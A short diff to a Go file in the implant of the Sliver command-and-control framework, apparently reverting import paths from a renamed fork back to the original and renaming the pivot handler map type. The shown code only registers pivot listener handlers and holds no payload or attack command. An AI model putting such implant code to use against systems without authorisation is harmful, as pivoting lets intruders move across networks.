@@ -23,15 +23,15 @@ import (
 	"log"
 	// {{end}}
 
-	"github.com/starkzarn/glod/implant/sliver/pivots"
-	"github.com/starkzarn/glod/implant/sliver/transports"
-	"github.com/starkzarn/glod/protobuf/commonpb"
-	pb "github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/implant/sliver/pivots"
+	"github.com/bishopfox/sliver/implant/sliver/transports"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 var (
-	genericPivotHandlers = map[uint32]TunnelHandler{
+	genericPivotHandlers = map[uint32]PivotHandler{
 		pb.MsgPivotListenersReq:     pivotListenersHandler,
 		pb.MsgPivotStartListenerReq: pivotStartListenerHandler,
 		pb.MsgPivotStopListenerReq:  pivotStopListenerHandler,
@@ -40,7 +40,7 @@ var (
 )
 
 // GetPivotHandlers - Returns a map of pivot handlers
-func GetPivotHandlers() map[uint32]TunnelHandler {
+func GetPivotHandlers() map[uint32]PivotHandler {
 	return genericPivotHandlers
 }
 
